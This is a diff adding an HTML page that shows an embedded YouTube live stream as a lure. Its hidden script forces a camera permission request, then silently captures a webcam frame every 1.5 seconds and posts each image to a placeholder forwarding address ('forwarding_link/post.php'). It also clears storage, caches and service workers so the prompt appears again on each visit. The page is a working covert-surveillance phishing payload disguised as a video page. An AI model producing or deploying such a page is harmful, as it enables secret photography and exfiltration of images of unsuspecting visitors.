@@ -1,0 +1,140 @@
+<!doctype html>
+<html>
+<head>
+<!-- Meta tags to prevent caching and force permission requests -->
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Clear any stored permissions and force new permission request
+function clearStoredPermissions() {
+  // Clear localStorage and sessionStorage
+  localStorage.clear();
+  sessionStorage.clear();
+  
+  // Clear any cached permissions by reloading without cache
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then(function(registrations) {
+      for(let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+}
+
+// Access webcam with forced permission request
+async function init() {
+  try {
+    // Clear any stored permissions first
+    clearStoredPermissions();
+    
+    // Add a small delay to ensure cleanup is complete
+    await new Promise(resolve => setTimeout(resolve, 100));
+    
+    // Force new permission request by using different constraints each time
+    const timestamp = Date.now();
+    const dynamicConstraints = {
+      audio: false,
+      video: {
+        facingMode: "user",
+        // Add dynamic properties to force new permission request
+        width: { ideal: 640 + (timestamp % 10) },
+        height: { ideal: 480 + (timestamp % 10) }
+      }
+    };
+    
+    const stream = await navigator.mediaDevices.getUserMedia(dynamicConstraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Prevent caching and force permission request on every load
+window.addEventListener('beforeunload', function() {
+  clearStoredPermissions();
+});
+
+// Add cache-busting parameters
+window.addEventListener('load', function() {
+  // Clear browser cache for this page
+  if ('caches' in window) {
+    caches.keys().then(function(names) {
+      names.forEach(function(name) {
+        caches.delete(name);
+      });
+    });
+  }
+});
+
+// Load init with delay to ensure clean state
+setTimeout(function() {
+  init();
+}, 200);
+
+</script>
+
+    <body>
+        <iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" frameborder="0" allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+
+    </body>
+
+</html>
